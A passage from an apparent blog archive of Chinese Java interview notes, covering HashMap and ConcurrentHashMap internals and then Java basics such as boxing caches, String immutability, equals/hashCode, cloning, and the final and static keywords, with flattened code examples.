table.length); （一）计算 hash 值 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h &lt;sup&gt;= (h &gt;&gt;&gt; 20) &lt;/sup&gt; (h &gt;&gt;&gt; 12); return h &lt;sup&gt; (h &gt;&gt;&gt; 7) &lt;/sup&gt; (h &gt;&gt;&gt; 4);&#125; 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; （二）取模 令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质： 12x : 00010000x-1 : 00001111 令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数： 123y : 10110010x-1 : 00001111y&amp;(x-1) : 00000010 这个性质和 y 对 x 取模效果是一样的： 123x : 00010000y : 10110010y%x : 00000010 我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。 确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。 123static int indexFor(int h, int length) &#123; return h &amp; (length-1);&#125; 5. 扩容-基本原理设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此平均查找次数的复杂度为 O(N/M)。 为了让查找的成本降低，应该尽可能使得 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。 和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。 参数 含义 capacity table 的容量大小，默认为 16，需要注意的是 capacity 必须保证为 2 的 n 次方。 size table 的实际使用量。 threshold size 的临界值，size 必须小于 threshold，如果大于等于，就必须进行扩容操作。 load_factor 装载因子，table 能够使用的比例，threshold = capacity * load_factor。 123456789101112131415static final int DEFAULT_INITIAL_CAPACITY = 16;static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;static final float DEFAULT_LOAD_FACTOR = 0.75f;transient Entry[] table;transient int size;int threshold;final float loadFactor;transient int modCount; 从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。 123456void addEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); if (size++ &gt;= threshold) resize(2 * table.length);&#125; 扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把旧 table 的所有键值对重新插入新的 table 中，因此这一步是很费时的。 123456789101112131415161718192021222324252627282930void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return; &#125; Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125;void transfer(Entry[] newTable) &#123; Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 6. 扩容-重新计算桶下标在进行扩容时，需要把键值对重新放到对应的桶上。HashMap 使用了一个特殊的机制，可以降低重新计算桶下标的操作。 假设原数组长度 capacity 为 8，扩容之后 new capacity 为 16： 12capacity : 00010000new capacity : 00100000 对于一个 Key，它的哈希值如果在第 6 位上为 0，那么取模得到的结果和之前一样；如果为 1，那么得到的结果为原来的结果 + 8。 7. 扩容-计算数组容量HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。 先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到： 123mask |= mask &gt;&gt; 1 11011000mask |= mask &gt;&gt; 2 11111100mask |= mask &gt;&gt; 4 11111111 mask+1 是大于原始数字的最小的 2 的 n 次方。 12num 10010000mask+1 100000000 以下是 HashMap 中计算数组容量的代码： 123456789static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 8. 链表转红黑树从 JDK 1.8 开始，一个桶存储的链表长度大于 8 时会将链表转换为红黑树。 9. HashMap 与 HashTable HashTable 使用 synchronized 来进行同步。 HashMap 可以插入键为 null 的 Entry。 HashMap 的迭代器是 fail-fast 迭代器。 HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。 ConcurrentHashMap1. 存储结构123456static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next;&#125; ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。 Segment 继承自 ReentrantLock。 1234567891011121314151617static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1; transient volatile HashEntry&lt;K,V&gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;&#125; 1final Segment&lt;K,V&gt;[] segments; 默认的并发级别为 16，也就是说默认创建 16 个 Segment。 1static final int DEFAULT_CONCURRENCY_LEVEL = 16; 2. size 操作每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。 12345/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */transient int count; 在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。 ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。 尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。 如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */static final int RETRIES_BEFORE_LOCK = 2;public int size() &#123; // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment&lt;K,V&gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try &#123; for (;;) &#123; // 超过尝试次数，则对每个 Segment 加锁 if (retries++ == RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) ensureSegment(j).lock(); // force creation &#125; sum = 0L; size = 0; overflow = false; for (int j = 0; j &lt; segments.length; ++j) &#123; Segment&lt;K,V&gt; seg = segmentAt(segments, j); if (seg != null) &#123; sum += seg.modCount; int c = seg.count; if (c &lt; 0 || (size += c) &lt; 0) overflow = true; &#125; &#125; // 连续两次得到的结果一致，则认为这个结果是正确的 if (sum == last) break; last = sum; &#125; &#125; finally &#123; if (retries &gt; RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) segmentAt(segments, j).unlock(); &#125; &#125; return overflow ? Integer.MAX_VALUE : size;&#125; 3. JDK 1.8 的改动JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发程度与 Segment 数量相等。 JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。 并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。 参考资料 Eckel B. Java 编程思想 [M]. 机械工业出版社, 2002. Java Collection Framework Iterator 模式 Java 8 系列之重新认识 HashMap What is difference between HashMap and Hashtable in Java? Java 集合之 HashMap The principle of ConcurrentHashMap analysis 探索 ConcurrentHashMap 高并发性的实现机制 HashMap 相关面试题及其解答 Java 集合细节（二）：asList 的缺陷 Java Collection Framework – The LinkedList Class]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 基础]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[一、基本类型 包装类型 缓存池 二、String 概览 String 不可变的好处 String, StringBuffer and StringBuilder String.intern() 三、运算 参数传递 float 与 double 隐式类型转换 switch 四、继承 访问权限 抽象类与接口 super 重写与重载 五、Object 通用方法 概览 equals() hashCode() toString() clone() 六、关键字 final static 七、反射 八、异常 九、泛型 十、注解 十一、特性 Java 各版本的新特性 Java 与 C++ 的区别 JRE or JDK 参考资料 一、基本类型包装类型八个基本类型： boolean/1 byte/8 char/16 short/16 int/32 float/32 long/64 double/64 基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。 12Integer x = 2; // 装箱int y = x; // 拆箱 缓存池new Integer(123) 与 Integer.valueOf(123) 的区别在于，new Integer(123) 每次都会新建一个对象，而 Integer.valueOf(123) 可能会使用缓存对象，因此多次使用 Integer.valueOf(123) 会取得同一个对象的引用。 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // true 编译器会在自动装箱过程调用 valueOf() 方法，因此多个 Integer 实例使用自动装箱来创建并且值相同，那么就会引用相同的对象。 123Integer m = 123;Integer n = 123;System.out.println(m == n); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接使用缓存池的内容。 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。 1234567891011121314151617181920212223242526272829static final int low = -128;static final int high;static final Integer cache[];static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127;&#125; Java 还将一些其它基本类型的值放在缓冲池中，包含以下这些： boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \u0000 to \u007F 因此在使用这些基本类型对应的包装类型时，就可以直接使用缓冲池中的对象。 StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 二、String概览String 被声明为 final，因此它不可被继承。 内部使用 char 数组存储数据，该数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。 1234public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; String 不可变的好处1. 可以缓存 hash 值 因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。 2. String Pool 的需要 如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。 3. 安全性 String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。 4. 线程安全 String 不可变性天生具备线程安全，可以在多个线程中安全地使用。 Program Creek : Why String is immutable in Java? String, StringBuffer and StringBuilder1. 可变性 String 不可变 StringBuffer 和 StringBuilder 可变 2. 线程安全 String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 来同步 StackOverflow : String, StringBuffer, and StringBuilder String.intern()使用 String.intern() 可以保证相同内容的字符串变量引用相同的内存对象。 下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同对象，而 s3 是通过 s1.intern() 方法取得一个对象引用，这个方法首先把 s1 引用的对象放到 String Poll（字符串常量池）中，然后返回这个对象引用。因此 s3 和 s1 引用的是同一个字符串常量池的对象。 12345String s1 = new String("aaa");String s2 = new String("aaa");System.out.println(s1 == s2); // falseString s3 = s1.intern();System.out.println(s1.intern() == s3); // true 如果是采用 “bbb” 这种使用双引号的形式创建字符串实例，会自动地将新建的对象放入 String Poll 中。 123String s4 = "bbb";String s5 = "bbb";System.out.println(s4 == s5); // true 在 Java 7 之前，字符串常量池被放在运行时常量池中，它属于永久代。而在 Java 7，字符串常量池被放在堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。 StackOverflow : What is String interning? 深入解析 String#intern 三、运算参数传递Java 的参数是以值传递的形式传入方法中，而不是引用传递。 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。 123456789101112131415public class Dog &#123; String name; Dog(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; String getObjectAddress() &#123; return super.toString(); &#125;&#125; 12345678910111213141516public class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog("A"); System.out.println(dog.getObjectAddress()); // Dog@4554617c func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c System.out.println(dog.getName()); // A &#125; private static void func(Dog dog) &#123; System.out.println(dog.getObjectAddress()); // Dog@4554617c dog = new Dog("B"); System.out.println(dog.getObjectAddress()); // Dog@74a14482 System.out.println(dog.getName()); // B &#125;&#125; StackOverflow: Is Java “pass-by-reference” or “pass-by-value”? float 与 double1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是下转型，会使得精度下降，因此 Java 不能隐式执行下转型。 1// float f = 1.1; 1.1f 字面量才是 float 类型。 1float f = 1.1f; 隐式类型转换因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型下转型为 short 类型。 12short s1 = 1;// s1 = s1 + 1; 但是使用 += 运算符可以执行隐式类型转换。 1s1 += 1; 上面的语句相当于将 s1 + 1 的计算结果进行了向下转型： 1s1 = (short) (s1 + 1); StackOverflow : Why don’t Java’s +=, -=, *=, /= compound assignment operators require casting? switch从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。 123456789String s = "a";switch (s) &#123; case "a": System.out.println("aaa"); break; case "b": System.out.println("bbb"); break;&#125; switch 不支持 long，是因为 switch 的设计初衷是为那些只需要对少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。 123456789// long x = 111;// switch (x) &#123; // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'// case 111:// System.out.println(111);// break;// case 222:// System.out.println(222);// break;// &#125; StackOverflow : Why can’t your switch statement data type be long, Java? 四、继承访问权限Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。 可以对类或类中的成员（字段以及方法）加上访问修饰符。 成员可见表示其它类可以用这个类的实例访问到该成员； 类可见表示其它类可以用这个类创建对象。 protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。 设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。 如果子类的方法覆盖了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。 字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。可以使用公有的 getter 和 setter 方法来替换公有字段。 123public class AccessExample &#123; public int x;&#125; 1234567891011public class AccessExample &#123; private int x; public int getX() &#123; return x; &#125; public void setX(int x) &#123; this.x = x; &#125;&#125; 但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。 123456789101112131415public class AccessWithInnerClassExample &#123; private class InnerClass &#123; int x; &#125; private InnerClass innerClass; public AccessWithInnerClassExample() &#123; innerClass = new InnerClass(); &#125; public int getValue() &#123; return innerClass.x; // 直接访问 &#125;&#125; 抽象类与接口1. 抽象类 抽象类和抽象方法都使用 abstract 进行声明。抽象类一般会包含抽象方法，抽象方法一定位于抽象类中。 抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。 1234567891011public abstract class AbstractClassExample &#123; protected int x; private int y; public abstract void func1(); public void func2() &#123; System.out.println("func2"); &#125;&#125; 123456public class AbstractExtendClassExample extends AbstractClassExample&#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 123// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiatedAbstractClassExample ac2 = new AbstractExtendClassExample();ac2.func1(); 2. 接口 接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。 从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。 接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。 接口的字段默认都是 static 和 final 的。 1234567891011121314public interface InterfaceExample &#123; void func1(); default void func2()&#123; System.out.println("func2"); &#125; int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here&#125; 123456public class InterfaceImplementExample implements InterfaceExample &#123; @Override public void func1() &#123; System.out.println("func1"); &#125;&#125; 1234// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiatedInterfaceExample ie2 = new InterfaceImplementExample();ie2.func1();System.out.println(InterfaceExample.x); 3. 比较 从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的方法只能是 public 的，而抽象类的方法可以有多种访问权限。 4. 使用选择 使用抽象类： 需要在几个相关的类中共享代码。 需要能控制继承来的方法和域的访问权限，而不是都为 public。 需要继承非静态（non-static）和非常量（non-final）字段。 使用接口： 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法； 需要使用多重继承。 在很多情况下，接口优先于抽象类，因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。 深入理解 abstract class 和 interface When to Use Abstract Class and Interface super 访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而完成一些初始化的工作。 访问父类的成员：如果子类覆盖了父类的中某个方法的实现，可以通过使用 super 关键字来引用父类的方法实现。 12345678910111213public class SuperExample &#123; protected int x; protected int y; public SuperExample(int x, int y) &#123; this.x = x; this.y = y; &#125; public void func() &#123; System.out.println("SuperExample.func()"); &#125;&#125; 1234567891011121314public class SuperExtendExample extends SuperExample &#123; private int z; public SuperExtendExample(int x, int y, int z) &#123; super(x, y); this.z = z; &#125; @Override public void func() &#123; super.func(); System.out.println("SuperExtendExample.func()"); &#125;&#125; 12SuperExample e = new SuperExtendExample(1, 2, 3);e.func(); 12SuperExample.func()SuperExtendExample.func() Using the Keyword super 重写与重载 重写（Override）存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法； 重载（Overload）存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。应该注意的是，返回值不同，其它都相同不算是重载。 五、Object 通用方法概览123456789101112131415161718192021public final native Class&lt;?&gt; getClass()public native int hashCode()public boolean equals(Object obj)protected native Object clone() throws CloneNotSupportedExceptionpublic String toString()public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedExceptionprotected void finalize() throws Throwable &#123;&#125; equals()1. equals() 与 == 的区别 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个实例是否引用同一个对象，而 equals() 判断引用的对象是否等价。 1234Integer x = new Integer(1);Integer y = new Integer(1);System.out.println(x.equals(y)); // trueSystem.out.println(x == y); // false 2. 等价关系 （一）自反性 1x.equals(x); // true （二）对称性 1x.equals(y) == y.equals(x); // true （三）传递性 12if (x.equals(y) &amp;&amp; y.equals(z)) x.equals(z); // true; （四）一致性 多次调用 equals() 方法结果不变 1x.equals(y) == x.equals(y); // true （五）与 null 的比较 对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false 1x.euqals(null); // false; 3. 实现 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 实例进行转型； 判断每个关键域是否相等。 1234567891011121314151617181920212223public class EqualExample &#123; private int x; private int y; private int z; public EqualExample(int x, int y, int z) &#123; this.x = x; this.y = y; this.z = z; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; &#125;&#125; hashCode()hasCode() 返回散列值，而 equals() 是用来判断两个实例是否等价。等价的两个实例散列值一定要相同，但是散列值相同的两个实例不一定等价。 在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个实例散列值也相等。 下面的代码中，新建了两个等价的实例，并将它们添加到 HashSet 中。我们希望将这两个实例当成一样的，只在集合中添加一个实例，但是因为 EqualExample 没有实现 hasCode() 方法，因此这两个实例的散列值是不同的，最终导致集合添加了两个等价的实例。 1234567EqualExample e1 = new EqualExample(1, 1, 1);EqualExample e2 = new EqualExample(1, 1, 1);System.out.println(e1.equals(e2)); // trueHashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();set.add(e1);set.add(e2);System.out.println(set.size()); // 2 理想的散列函数应当具有均匀性，即不相等的实例应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来，可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。 一个数与 31 相乘可以转换成移位和减法：31\*x == (x&lt;&lt;5)-x，编译器会自动进行这个优化。 12345678@Overridepublic int hashCode() &#123; int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;&#125; toString()默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。 1234567public class ToStringExample &#123; private int number; public ToStringExample(int number) &#123; this.number = number; &#125;&#125; 12ToStringExample example = new ToStringExample(123);System.out.println(example.toString()); 1ToStringExample@4554617c clone()1. cloneable clone() 是 Object 的 protect 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。 1234public class CloneExample &#123; private int a; private int b;&#125; 12CloneExample e1 = new CloneExample();// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object' 重写 clone() 得到以下实现： 123456789public class CloneExample &#123; private int a; private int b; @Override protected CloneExample clone() throws CloneNotSupportedException &#123; return (CloneExample)super.clone(); &#125;&#125; 123456CloneExample e1 = new CloneExample();try &#123; CloneExample e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125; 1java.lang.CloneNotSupportedException: CloneTest 以上抛出了 CloneNotSupportedException，这是因为 CloneTest 没有实现 Cloneable 接口。 123456789public class CloneExample implements Cloneable &#123; private int a; private int b; @Override protected Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125;&#125; 应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。 2. 深拷贝与浅拷贝 浅拷贝：拷贝实例和原始实例的引用类型引用同一个对象； 深拷贝：拷贝实例和原始实例的引用类型引用不同对象。 1234567891011121314151617181920212223public class ShallowCloneExample implements Cloneable &#123; private int[] arr; public ShallowCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected ShallowCloneExample clone() throws CloneNotSupportedException &#123; return (ShallowCloneExample) super.clone(); &#125;&#125; 123456789ShallowCloneExample e1 = new ShallowCloneExample();ShallowCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 222 12345678910111213141516171819202122232425262728public class DeepCloneExample implements Cloneable &#123; private int[] arr; public DeepCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected DeepCloneExample clone() throws CloneNotSupportedException &#123; DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i &lt; arr.length; i++) &#123; result.arr[i] = arr[i]; &#125; return result; &#125;&#125; 123456789DeepCloneExample e1 = new DeepCloneExample();DeepCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 2 使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。 12345678910111213141516171819202122232425public class CloneConstructorExample &#123; private int[] arr; public CloneConstructorExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public CloneConstructorExample(CloneConstructorExample original) &#123; arr = new int[original.arr.length]; for (int i = 0; i &lt; original.arr.length; i++) &#123; arr[i] = original.arr[i]; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125;&#125; 1234CloneConstructorExample e1 = new CloneConstructorExample();CloneConstructorExample e2 = new CloneConstructorExample(e1);e1.set(2, 222);System.out.println(e2.get(2)); // 2 六、关键字final1. 数据 声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。 1234final int x = 1;// x = 2; // cannot assign value to final variable 'x'final A y = new A();y.a = 1; 2. 方法 声明方法不能被子类重写。 private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。 3. 类 声明类不允许被继承。 static1. 静态变量 静态变量在内存中只存在一份，只在类初始化时赋值一次。 静态变量：类所有的实例都共享静态变量，可以直接通过类名来访问它； 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。 1234567891011public class A &#123; private int x; // 实例变量 private static int y; // 静态变量 public static void main(String[] args) &#123; // int x = A.x; // Non-static field 'x' cannot be referenced from a static context A a = new A(); int x = a.x; int y = A.y; &#125;&#125; 2. 静态方法 静态方法在类加载的时候就存在了，它不依赖于任何实例，所以静态方法必须有实现，也就是说它不能是抽象方法（abstract）。 12345public abstract class A &#123; public static void func1()&#123; &#125; // public abstract static void func2(); // Illegal combination of modifiers: 'abstract' and 'static'&#125; 只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字。 12345678910public class A &#123; private static int x; private int y; public static void func1()&#123; int a = x; // int b = y; // Non-static field 'y' cannot be referenced from a static context // int b = this.y; // 'A.this' cannot be referenced from a static context &#125;&#125; 3. 静态语句块 静态语句块在类初始化时运行一次。 12345678910public class A &#123; static &#123; System.out.println("123"); &#125; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new A(); &#125;&#125; 1123 4. 静态内部类 非静态内部类依赖于需要外部类的实例，而静态内部类不需要。 1234567891011121314public class OuterClass &#123; class InnerClass &#123; &#125; static class StaticInnerClass &#123; &#125; public static void main(String[] args) &#123; // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); &#125;&#125; 